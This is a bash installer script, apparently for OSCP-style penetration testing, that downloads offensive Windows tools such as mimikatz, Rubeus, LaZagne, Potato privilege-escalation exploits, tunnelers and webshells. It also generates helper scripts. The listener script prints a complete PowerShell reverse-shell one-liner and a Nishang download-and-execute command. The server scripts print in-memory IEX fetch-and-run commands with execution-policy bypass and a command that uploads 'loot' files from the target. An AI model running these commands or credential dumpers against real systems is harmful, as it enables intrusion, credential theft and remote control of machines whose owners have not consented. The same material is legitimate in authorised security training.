#!/bin/bash

#=============================================================================
# WINDOWS-ARSENAL v2.0 - Production Edition
# Author: @mahdiesta  
# OSCP/OSCP+ Compliant - Enumeration Only
#=============================================================================

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'
P='\033[0;35m'; C='\033[0;36m'; NC='\033[0m'

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
DEFAULT_TOOLS_DIR="${HOME}/windows-arsenal"
TOOLS_DIR="${1:-$DEFAULT_TOOLS_DIR}"
VERSION="2.0-production"

mkdir -p "${TOOLS_DIR}" 2>/dev/null
TEMP_DIR="${TOOLS_DIR}/.tmp"
LOG_FILE="${TOOLS_DIR}/.download.log"
mkdir -p "${TEMP_DIR}" 2>/dev/null
touch "${LOG_FILE}" 2>/dev/null

#=============================================================================
# HELPER FUNCTIONS
#=============================================================================

log() {
    local level="$1"; local message="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    [ -f "${LOG_FILE}" ] && echo "${timestamp} [${level}] ${message}" >> "${LOG_FILE}" 2>/dev/null
    case "$level" in
        "INFO")   echo -e "${G}[+]${NC} ${message}" ;;
        "WARN")   echo -e "${Y}[!]${NC} ${message}" ;;
        "ERROR")  echo -e "${R}[-]${NC} ${message}" ;;
        "DEBUG")  echo -e "${B}[*]${NC} ${message}" ;;
        "HEADER") echo -e "\n${P}===>${NC} ${message}" ;;
    esac
}

check_dependencies() {
    log "HEADER" "Checking Dependencies"
    local deps=("curl" "wget" "git" "unzip" "python3")
    local missing=()
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then missing+=("$dep"); fi
    done
    if [ ${#missing[@]} -ne 0 ]; then
        log "WARN" "Missing: ${missing[*]}"
        sudo apt-get update -qq && sudo apt-get install -y -qq curl wget git unzip python3 python3-pip 2>/dev/null
        pip3 install impacket uploadserver 2>/dev/null
    fi
    log "INFO" "Dependencies OK"
}

create_directories() {
    log "HEADER" "Creating Directory Structure"
    local dirs=("enumeration" "privesc" "exploit-suggesters" "credential-dumpers" "sysinternals" "tunneling" "shells" "transfer" "compiled-binaries" "powershell-scripts" "cheatsheets" "wordlists")
    for dir in "${dirs[@]}"; do mkdir -p "${TOOLS_DIR}/${dir}"; done
    log "INFO" "Directories created"
}

download_file() {
    local url="$1"; local output="$2"; local name="$3"
    if [ -z "$url" ]; then return 1; fi
    if curl -sL --connect-timeout 15 --max-time 180 -o "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then log "INFO" "Downloaded: ${name}"; return 0; fi
    fi
    if wget -q --timeout=15 -O "${output}" "${url}" 2>/dev/null; then
        if [ -s "${output}" ]; then log "INFO" "Downloaded: ${name}"; return 0; fi
    fi
    rm -f "${output}" 2>/dev/null
    log "WARN" "Failed: ${name}"
    return 1
}

download_with_fallback() {
    local name="$1"; local output="$2"; shift 2; local urls=("$@")
    for url in "${urls[@]}"; do
        if download_file "$url" "$output" "$name"; then return 0; fi
    done
    log "WARN" "All URLs failed: ${name}"; return 1
}

git_clone() {
    local repo="$1"; local dest="$2"; local name="$3"
    if [ -d "${dest}" ]; then log "INFO" "${name} (exists)"; return 0; fi
    if git clone --depth 1 "${repo}" "${dest}" 2>/dev/null; then
        log "INFO" "${name}"; return 0
    else
        log "WARN" "Failed to clone: ${name}"; return 1
    fi
}

#=============================================================================
# DOWNLOAD ENUMERATION TOOLS
#=============================================================================

download_enumeration_tools() {
    log "HEADER" "Downloading Enumeration Tools"
    local enum="${TOOLS_DIR}/enumeration"
    local ps="${TOOLS_DIR}/powershell-scripts"
    local exp="${TOOLS_DIR}/exploit-suggesters"
    
    log "DEBUG" "Tier 1: Primary Enumeration"
    
    download_with_fallback "winPEASany.exe" "${enum}/winPEASany.exe" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe" \
        "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe"
    
    download_with_fallback "winPEASx64.exe" "${enum}/winPEASx64.exe" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe"
    
    download_with_fallback "winPEASx86.exe" "${enum}/winPEASx86.exe" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe"
    
    download_with_fallback "winPEAS.bat" "${enum}/winPEAS.bat" \
        "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat" \
        "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat"
    
    download_with_fallback "Seatbelt.exe" "${enum}/Seatbelt.exe" \
        "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe"
    
    git_clone "https://github.com/GhostPack/Seatbelt.git" "${enum}/Seatbelt-Source" "Seatbelt Source"
    
    download_with_fallback "SharpUp.exe" "${enum}/SharpUp.exe" \
        "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe"
    
    git_clone "https://github.com/GhostPack/SharpUp.git" "${enum}/SharpUp-Source" "SharpUp Source"
    
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" \
        "${ps}/PowerUp.ps1" "PowerUp.ps1"
    
    download_file "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" \
        "${ps}/jaws-enum.ps1" "JAWS"
    
    download_file "https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1" \
        "${ps}/PrivescCheck.ps1" "PrivescCheck.ps1"
    
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" \
        "${ps}/PowerView.ps1" "PowerView.ps1"
    
    log "DEBUG" "Tier 2: Exploit Suggesters"
    
    git_clone "https://github.com/bitsadmin/wesng.git" "${exp}/wesng" "WES-NG"
    
    download_with_fallback "Watson.exe" "${exp}/Watson.exe" \
        "https://github.com/rasta-mouse/Watson/raw/master/Watson/bin/Release/Watson.exe"
    
    git_clone "https://github.com/rasta-mouse/Watson.git" "${exp}/Watson-Source" "Watson Source"
    
    download_file "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" \
        "${ps}/Sherlock.ps1" "Sherlock.ps1"
}

download_credential_tools() {
    log "HEADER" "Downloading Credential Tools"
    local cred="${TOOLS_DIR}/credential-dumpers"
    local ps="${TOOLS_DIR}/powershell-scripts"
    
    download_with_fallback "lazagne.exe" "${cred}/lazagne.exe" \
        "https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe" \
        "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
    
    git_clone "https://github.com/AlessandroZ/LaZagne.git" "${cred}/LaZagne-Source" "LaZagne Source"
    
    download_file "https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1" \
        "${ps}/SessionGopher.ps1" "SessionGopher.ps1"
    
    download_with_fallback "mimikatz.zip" "${TEMP_DIR}/mimikatz.zip" \
        "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip"
    
    if [ -f "${TEMP_DIR}/mimikatz.zip" ]; then
        unzip -q "${TEMP_DIR}/mimikatz.zip" -d "${TEMP_DIR}/mimikatz" 2>/dev/null
        cp "${TEMP_DIR}/mimikatz/x64/mimikatz.exe" "${cred}/mimikatz_x64.exe" 2>/dev/null
        cp "${TEMP_DIR}/mimikatz/Win32/mimikatz.exe" "${cred}/mimikatz_x86.exe" 2>/dev/null
        log "INFO" "Extracted mimikatz binaries"
    fi
    
    download_file "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1" \
        "${ps}/Invoke-Mimikatz.ps1" "Invoke-Mimikatz.ps1"
    
    download_with_fallback "Rubeus.exe" "${cred}/Rubeus.exe" \
        "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe"
    
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpDPAPI.exe" \
        "${cred}/SharpDPAPI.exe" "SharpDPAPI.exe"
    
    download_file "https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1" \
        "${ps}/Inveigh.ps1" "Inveigh.ps1"
}

download_sysinternals() {
    log "HEADER" "Downloading Sysinternals Suite"
    local sys="${TOOLS_DIR}/sysinternals"
    
    download_file "https://download.sysinternals.com/files/SysinternalsSuite.zip" \
        "${TEMP_DIR}/sysinternals.zip" "Sysinternals Suite"
    
    if [ -f "${TEMP_DIR}/sysinternals.zip" ]; then
        unzip -q "${TEMP_DIR}/sysinternals.zip" -d "${sys}" 2>/dev/null
        log "INFO" "Extracted Sysinternals Suite"
    fi
}

download_tunneling_tools() {
    log "HEADER" "Downloading Tunneling Tools"
    local tun="${TOOLS_DIR}/tunneling"
    
    download_with_fallback "chisel_windows_amd64.gz" "${TEMP_DIR}/chisel_windows.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_windows_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz" \
        "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz"
    
    [ -f "${TEMP_DIR}/chisel_windows.gz" ] && gunzip -c "${TEMP_DIR}/chisel_windows.gz" > "${tun}/chisel.exe" 2>/dev/null
    
    download_with_fallback "chisel_windows_386.gz" "${TEMP_DIR}/chisel_windows_386.gz" \
        "https://github.com/jpillora/chisel/releases/latest/download/chisel_1.10.1_windows_386.gz"
    
    [ -f "${TEMP_DIR}/chisel_windows_386.gz" ] && gunzip -c "${TEMP_DIR}/chisel_windows_386.gz" > "${tun}/chisel_x86.exe" 2>/dev/null
    
    download_with_fallback "ligolo_agent.zip" "${TEMP_DIR}/ligolo_agent.zip" \
        "https://github.com/nicocha30/ligolo-ng/releases/latest/download/ligolo-ng_agent_0.7.5_windows_amd64.zip" \
        "https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_agent_0.7.5_windows_amd64.zip"
    
    [ -f "${TEMP_DIR}/ligolo_agent.zip" ] && unzip -q "${TEMP_DIR}/ligolo_agent.zip" -d "${tun}/" 2>/dev/null
    
    download_file "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" "${tun}/plink.exe" "plink.exe"
    download_file "https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe" "${tun}/plink_x86.exe" "plink_x86.exe"
}

download_shells_and_transfer() {
    log "HEADER" "Downloading Shells & Transfer"
    local shells="${TOOLS_DIR}/shells"
    local transfer="${TOOLS_DIR}/transfer"
    local ps="${TOOLS_DIR}/powershell-scripts"
    
    download_file "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" "${transfer}/nc64.exe" "nc64.exe"
    download_file "https://github.com/int0x33/nc.exe/raw/master/nc.exe" "${transfer}/nc.exe" "nc.exe"
    
    git_clone "https://github.com/samratashok/nishang.git" "${shells}/nishang" "Nishang"
    
    download_file "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" \
        "${ps}/Invoke-PowerShellTcp.ps1" "Invoke-PowerShellTcp.ps1"
    
    git_clone "https://github.com/tennc/webshell.git" "${shells}/webshell" "webshell"
    
    download_file "https://github.com/3ndG4me/socat-1.7.3.0-windows/raw/master/socat-1.7.3.0-windows.zip" \
        "${TEMP_DIR}/socat.zip" "socat"
    
    [ -f "${TEMP_DIR}/socat.zip" ] && unzip -q "${TEMP_DIR}/socat.zip" -d "${transfer}/" 2>/dev/null
}

download_additional_tools() {
    log "HEADER" "Downloading Additional Tools"
    local priv="${TOOLS_DIR}/privesc"
    
    download_file "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe" \
        "${priv}/PrintSpoofer64.exe" "PrintSpoofer64.exe"
    
    download_file "https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer32.exe" \
        "${priv}/PrintSpoofer32.exe" "PrintSpoofer32.exe"
    
    download_file "https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe" \
        "${priv}/JuicyPotato.exe" "JuicyPotato.exe"
    
    download_file "https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.exe" \
        "${priv}/RoguePotato.exe" "RoguePotato.exe"
    
    download_file "https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe" \
        "${priv}/GodPotato.exe" "GodPotato.exe"
    
    download_file "https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.exe" \
        "${priv}/RunasCs.exe" "RunasCs.exe"
    
    download_file "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe" \
        "${priv}/Certify.exe" "Certify.exe"
    
    download_file "https://github.com/eladshamir/Whisker/releases/latest/download/Whisker.exe" \
        "${priv}/Whisker.exe" "Whisker.exe"
    
    git_clone "https://github.com/S3cur3Th1sSh1t/PowerSharpPack.git" "${TOOLS_DIR}/compiled-binaries/PowerSharpPack" "PowerSharpPack"
}

download_wordlists() {
    log "HEADER" "Downloading Wordlists"
    local wl="${TOOLS_DIR}/wordlists"
    
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt" \
        "${wl}/10k-passwords.txt" "10k-passwords.txt"
    
    download_file "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt" \
        "${wl}/usernames.txt" "usernames.txt"
}

#=============================================================================
# CREATE SERVER SCRIPTS
#=============================================================================

create_server_scripts() {
    log "HEADER" "Creating Server Scripts"
    
    cat > "${TOOLS_DIR}/serve.sh" << 'HTTPEOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORT="${1:-8000}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

clear
cat << EOF
======================================================================
 WINDOWS ARSENAL - HTTP Server
 @mahdiesta
======================================================================
Server: http://${IP}:${PORT}
Path: ${SCRIPT_DIR}
======================================================================
TRANSFER METHODS
======================================================================

[PowerShell WebClient]
powershell -c "iwr http://${IP}:${PORT}/enumeration/winPEASx64.exe -outfile C:\Windows\Temp\wp.exe; C:\Windows\Temp\wp.exe"

[Certutil]
certutil -urlcache -f http://${IP}:${PORT}/enumeration/winPEASx64.exe wp.exe

[SMB - Use smb-serve.sh script instead]
\\\\${IP}\\share\\enumeration\\winPEASx64.exe

[In-Memory PowerShell]
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://${IP}:${PORT}/powershell-scripts/PowerUp.ps1'); Invoke-AllChecks"

======================================================================
Server starting on port ${PORT}...
======================================================================
EOF

cd "${SCRIPT_DIR}"
python3 -m http.server ${PORT} 2>/dev/null || python -m SimpleHTTPServer ${PORT}
HTTPEOF
    chmod +x "${TOOLS_DIR}/serve.sh"

    cat > "${TOOLS_DIR}/smb-serve.sh" << 'SMBEOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
USERNAME="${1:-guest}"
PASSWORD="${2:-}"

clear
cat << EOF
======================================================================
 WINDOWS ARSENAL - SMB Server
 @mahdiesta
======================================================================
Share: \\\\${IP}\\share
Path: ${SCRIPT_DIR}
User: ${USERNAME}
Pass: ${PASSWORD:-<none>}
======================================================================
USAGE ON TARGET
======================================================================

[No Auth]
copy \\\\${IP}\\share\\enumeration\\winPEASx64.exe C:\Windows\Temp\wp.exe

[With Auth]
net use \\\\${IP}\\share /user:${USERNAME} ${PASSWORD}
copy \\\\${IP}\\share\\enumeration\\winPEASx64.exe C:\Windows\Temp\wp.exe

[Direct Execute]
\\\\${IP}\\share\\enumeration\\winPEASx64.exe

======================================================================
Server starting...
======================================================================
EOF

if [ -z "$PASSWORD" ]; then
    impacket-smbserver share "${SCRIPT_DIR}" -smb2support
else
    impacket-smbserver share "${SCRIPT_DIR}" -smb2support -username "${USERNAME}" -password "${PASSWORD}"
fi
SMBEOF
    chmod +x "${TOOLS_DIR}/smb-serve.sh"

    cat > "${TOOLS_DIR}/listen.sh" << 'LISTENEOF'
#!/bin/bash
PORT="${1:-4444}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

clear
cat << EOF
======================================================================
 SMART LISTENER
 @mahdiesta
======================================================================
Listening: ${IP}:${PORT}
======================================================================
REVERSE SHELL COMMANDS
======================================================================

[PowerShell]
powershell -nop -c "\$client=New-Object System.Net.Sockets.TCPClient('${IP}',${PORT});\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){\$data=(New-Object Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"

[Nishang]
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/powershell-scripts/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ${IP} -Port ${PORT}"

======================================================================
Waiting for connection...
======================================================================
EOF

nc -lvnp ${PORT}
LISTENEOF
    chmod +x "${TOOLS_DIR}/listen.sh"

    cat > "${TOOLS_DIR}/upload.sh" << 'UPLOADEOF'
#!/bin/bash
PORT="${1:-8080}"
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')

clear
cat << EOF
======================================================================
 UPLOAD SERVER
 @mahdiesta
======================================================================
Listening: ${IP}:${PORT}
======================================================================
UPLOAD COMMANDS
======================================================================

[PowerShell]
powershell -c "\$wc=New-Object Net.WebClient;\$wc.UploadFile('http://${IP}:${PORT}/upload','C:\Windows\Temp\loot.txt')"

======================================================================
Server starting...
======================================================================
EOF

python3 -m uploadserver ${PORT}
UPLOADEOF
    chmod +x "${TOOLS_DIR}/upload.sh"
    
    log "INFO" "Created server scripts"
}

#=============================================================================
# DOCUMENTATION
#=============================================================================

create_documentation() {
    log "HEADER" "Creating Documentation"
    
    cat > "${TOOLS_DIR}/README.md" << 'EOF'
# Windows Arsenal v2.0
## Author: @mahdiesta

## Quick Start

```bash
./serve.sh           # HTTP server
./smb-serve.sh       # SMB server
./listen.sh 4444     # Listener
./upload.sh 8080     # Upload server
```

## OSCP Workflow

1. Start server: `./serve.sh`
2. Transfer tools to target
3. Run WinPEAS first
4. Run Seatbelt for detailed checks
5. Run Watson for exploits
6. Manual exploitation
7. Document everything

## Tool Categories

### Enumeration
- WinPEAS - Comprehensive
- Seatbelt - Detailed checks
- SharpUp - Quick checks
- PowerUp - Misconfigurations
- JAWS - PowerShell 2.0

### Exploit Suggesters
- Watson - Missing KBs
- WES-NG - Systeminfo analysis

### Credentials
- LaZagne - Password recovery
- Mimikatz - Memory extraction
- SessionGopher - Saved sessions

### Privilege Escalation
- PrintSpoofer
- JuicyPotato
- GodPotato
- RunasCs

### Tunneling
- Chisel
- Ligolo-ng
- Plink

## Enhanced by @mahdiesta
EOF

    log "INFO" "Created documentation"
}

#=============================================================================
# CLEANUP
#=============================================================================

cleanup() {
    log "HEADER" "Cleaning Up"
    rm -rf "${TEMP_DIR}" 2>/dev/null
    find "${TOOLS_DIR}" -type d -empty -delete 2>/dev/null
    chmod +x "${TOOLS_DIR}"/*.sh 2>/dev/null
    log "INFO" "Cleanup complete"
}

print_summary() {
    local IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || hostname -I | awk '{print $1}')
    
    cat << EOF

======================================================================
 DOWNLOAD COMPLETE
======================================================================

Tools Directory: ${TOOLS_DIR}
Your IP: ${IP}
Version: ${VERSION}

======================================================================
 QUICK START
======================================================================

Start HTTP Server:
  cd ${TOOLS_DIR} && ./serve.sh

Start SMB Server:
  ./smb-serve.sh

Start Listener:
  ./listen.sh 4444

Upload Server:
  ./upload.sh 8080

======================================================================
 OSCP WORKFLOW
======================================================================

1. Start server: ./serve.sh
2. Transfer WinPEAS to target
3. Run enumeration tools
4. Analyze output
5. Manual exploitation
6. Document findings

======================================================================
 ENHANCED BY @mahdiesta
======================================================================

Ready. Run: cd ${TOOLS_DIR} && ./serve.sh

======================================================================

EOF
}

#=============================================================================
# MAIN
#=============================================================================

main() {
    echo -e "${C}Windows Arsenal v2.0 - Production Edition${NC}"
    echo -e "${C}Author: @mahdiesta${NC}\n"
    
    log "INFO" "Starting Windows Arsenal - Target: ${TOOLS_DIR}"
    
    check_dependencies
    create_directories
    download_enumeration_tools
    download_credential_tools
    download_sysinternals
    download_tunneling_tools
    download_shells_and_transfer
    download_additional_tools
    download_wordlists
    create_server_scripts
    create_documentation
    cleanup
    
    print_summary
}

main "$@"
